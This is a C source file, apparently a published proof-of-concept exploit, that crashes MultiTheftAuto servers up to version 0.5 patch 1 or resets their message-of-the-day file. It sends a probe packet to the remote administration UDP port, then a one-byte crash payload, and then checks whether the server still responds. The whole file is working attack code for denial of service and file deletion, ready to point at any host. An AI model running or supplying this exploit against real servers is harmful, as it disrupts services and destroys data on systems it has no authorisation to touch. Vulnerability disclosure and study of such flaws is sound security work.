/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER     "0.1"
#define BUFFSZ  4096
#define PORT    4003
#define TIMEOUT 3
#define PING    "\x0d\x30\x00"  // not a ping, just a way to get a reply
#define BOOM    "\x28"          // that's enough



int timeout(int sock);
u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "MultiTheftAuto <= 0.5 patch 1 server crash/motd reset "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- check server:\n", stdout);
    if(sendto(sd, PING, sizeof(PING) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\n"
            "Error: the server doesn't seem to support remote administration\n"
            "       try using the port 24003\n"
            "\n", stdout);
        exit(1);
    }
    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
    if(len < 0) std_err();

    sleep(ONESEC);

    fputs("- send BOOM packet:\n", stdout);
    if(sendto(sd, BOOM, sizeof(BOOM) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    sleep(ONESEC);

    fputs("- check server:\n", stdout);
    if(sendto(sd, PING, sizeof(PING) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem to crash but probably you have deleted its motd.txt file\n\n", stdout);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct hostent *hp;
    u_int  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

